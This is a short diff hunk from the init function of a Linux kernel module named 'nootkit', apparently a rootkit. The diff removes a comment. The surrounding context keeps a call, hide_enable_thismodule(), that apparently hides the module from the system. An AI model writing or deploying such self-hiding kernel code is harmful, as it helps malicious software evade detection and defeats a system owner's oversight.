@@ -81,7 +81,6 @@ int nootkit_init(void)
         return res;
     }
 
-    // no need to call disable for this hide, see it's description
     hide_enable_thismodule();
 
     printk(KERN_INFO "nootkit: Initialized!\n");
